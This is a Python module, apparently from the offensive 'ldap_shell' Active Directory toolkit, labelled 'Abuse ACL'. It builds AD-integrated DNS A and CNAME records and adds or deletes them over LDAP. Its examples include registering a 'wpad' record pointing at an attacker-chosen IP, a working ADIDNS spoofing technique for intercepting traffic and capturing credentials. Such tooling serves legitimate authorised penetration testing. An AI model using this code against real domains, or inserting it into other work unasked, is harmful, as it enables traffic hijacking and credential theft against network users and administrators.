import logging
import socket
import struct
from typing import Optional

from ldap3 import MODIFY_ADD, Connection
from ldapdomaindump import domainDumper
from pydantic import BaseModel

from ldap_shell.ldap_modules.base_module import ArgumentType, BaseLdapModule, arg_field
from ldap_shell.utils.ldap_utils import LdapUtils

DNS_TYPE_A = 1
DNS_TYPE_CNAME = 5
RANK_ZONE = 240


def pack_dns_record(rtype: int, data: bytes, ttl: int = 180, serial: int = 1) -> bytes:
    """Pack an AD-integrated dnsRecord header + payload ([MS-DNSP] 2.3.2.2)."""
    header = struct.pack('<HHBBHI', len(data), rtype, 5, RANK_ZONE, 0, serial)
    header += struct.pack('>I', ttl)
    header += struct.pack('<II', 0, 0)
    return header + data


def pack_dns_a(ip: str, ttl: int = 180, serial: int = 1) -> bytes:
    """Pack an AD-integrated DNS A record."""
    try:
        data = socket.inet_aton(ip)
    except OSError as exc:
        raise ValueError(f'Invalid IPv4 address: {ip}') from exc
    return pack_dns_record(DNS_TYPE_A, data, ttl=ttl, serial=serial)


def encode_dns_count_name(fqdn: str) -> bytes:
    """Encode a FQDN as DNS_COUNT_NAME (Length, LabelCount, RawName)."""
    cleaned = (fqdn or '').strip().rstrip('.')
    if not cleaned:
        raise ValueError('Empty DNS name')
    labels = cleaned.split('.')
    raw = b''
    for label in labels:
        encoded = label.encode('utf-8')
        if not encoded or len(encoded) > 63:
            raise ValueError(f'Invalid DNS label: {label!r}')
        raw += bytes([len(encoded)]) + encoded
    raw += b'\x00'
    if len(raw) > 255:
        raise ValueError(f'DNS name too long: {fqdn}')
    return bytes([len(raw), len(labels)]) + raw


def pack_dns_cname(target: str, ttl: int = 180, serial: int = 1) -> bytes:
    """Pack an AD-integrated DNS CNAME record."""
    return pack_dns_record(DNS_TYPE_CNAME, encode_dns_count_name(target), ttl=ttl, serial=serial)


def unpack_dns_type(blob) -> Optional[int]:
    """Return the DNS type of a packed dnsRecord, or None if truncated."""
    if blob is None:
        return None
    raw = bytes(blob) if not isinstance(blob, bytes) else blob
    if len(raw) < 4:
        return None
    return struct.unpack_from('<H', raw, 2)[0]


class LdapShellModule(BaseLdapModule):
    """Add or delete an AD-integrated DNS node (A or CNAME)."""

    help_text = "Add or delete an ADIDNS A or CNAME record (DomainDnsZones / ForestDnsZones)"
    examples_text = """
    `set_dns wpad add A 10.0.0.5`
    `set_dns www add CNAME server.domain.local`
    `set_dns wpad del`
    Inline: `ldap_shell domain.local/user:pass set_dns www add CNAME server.domain.local`
    """
    module_type = "Abuse ACL"

    class ModuleArgs(BaseModel):
        name: str = arg_field(
            description="DNS node name (e.g. wpad)",
            arg_type=ArgumentType.STRING,
        )
        action: str = arg_field(
            description="Action: add or del",
            arg_type=ArgumentType.ACTION,
        )
        rtype: Optional[str] = arg_field(
            None,
            description="Record type: A or CNAME",
            arg_type=ArgumentType.STRING,
        )
        data: Optional[str] = arg_field(
            None,
            description="Record data (IPv4 for A, FQDN for CNAME)",
            arg_type=ArgumentType.STRING,
        )
        zone: Optional[str] = arg_field(
            None,
            description="DNS zone (default: current domain)",
            arg_type=ArgumentType.STRING,
        )

    def __init__(self, args_dict: dict, domain_dumper: domainDumper, client: Connection, log=None):
        self.args = self.ModuleArgs(**args_dict)
        self.domain_dumper = domain_dumper
        self.client = client
        self.log = log or logging.getLogger('ldap-shell.shell')

    def _zone_name(self) -> str:
        return self.args.zone or LdapUtils.get_domain_name(self.domain_dumper.root)

    def _zone_bases(self, zone: str):
        root = self.domain_dumper.root
        return [
            f'DC={zone},CN=MicrosoftDNS,DC=DomainDnsZones,{root}',
            f'DC={zone},CN=MicrosoftDNS,DC=ForestDnsZones,{root}',
        ]

    def _find_zone(self, zone: str) -> Optional[str]:
        for base in self._zone_bases(zone):
            if self.client.search(base, '(objectClass=dnsZone)', search_scope='BASE', attributes=['dc']):
                if self.client.entries:
                    return base
        return None

    def __call__(self):
        action = (self.args.action or '').lower()
        if action not in ('add', 'del'):
            self.log.error('Invalid action. Use add/del')
            return

        zone = self._zone_name()
        zone_dn = self._find_zone(zone)
        if not zone_dn:
            self.log.error(f'DNS zone not found: {zone}')
            return

        node_dn = f'DC={self.args.name},{zone_dn}'
        if action == 'del':
            if not self.client.delete(node_dn):
                self.log.error(f'Failed to delete {node_dn}: {self.client.result}')
                return
            self.log.info(f'Deleted DNS node {self.args.name} in {zone}')
            return

        rtype = (self.args.rtype or 'A').upper()
        if not self.args.data:
            self.log.error('Record data is required for add (IPv4 for A, FQDN for CNAME)')
            return
        try:
            if rtype == 'A':
                record = pack_dns_a(self.args.data)
            elif rtype == 'CNAME':
                record = pack_dns_cname(self.args.data)
            else:
                self.log.error('Only A and CNAME records are supported')
                return
        except ValueError as exc:
            self.log.error(str(exc))
            return

        exists = self.client.search(node_dn, '(objectClass=dnsNode)', search_scope='BASE', attributes=['dnsRecord'])
        if exists and self.client.entries:
            if not self.client.modify(node_dn, {'dnsRecord': [(MODIFY_ADD, [record])]}):
                self.log.error(f'Failed to add record on {node_dn}: {self.client.result}')
                return
            self.log.info(f'Added {rtype} {self.args.data} to existing node {self.args.name}')
            return

        if not self.client.add(
            node_dn,
            ['top', 'dnsNode'],
            {'dc': self.args.name, 'dnsRecord': [record]},
        ):
            self.log.error(f'Failed to create {node_dn}: {self.client.result}')
            return
        self.log.info(f'Created DNS node {self.args.name} {rtype} {self.args.data} in {zone}')
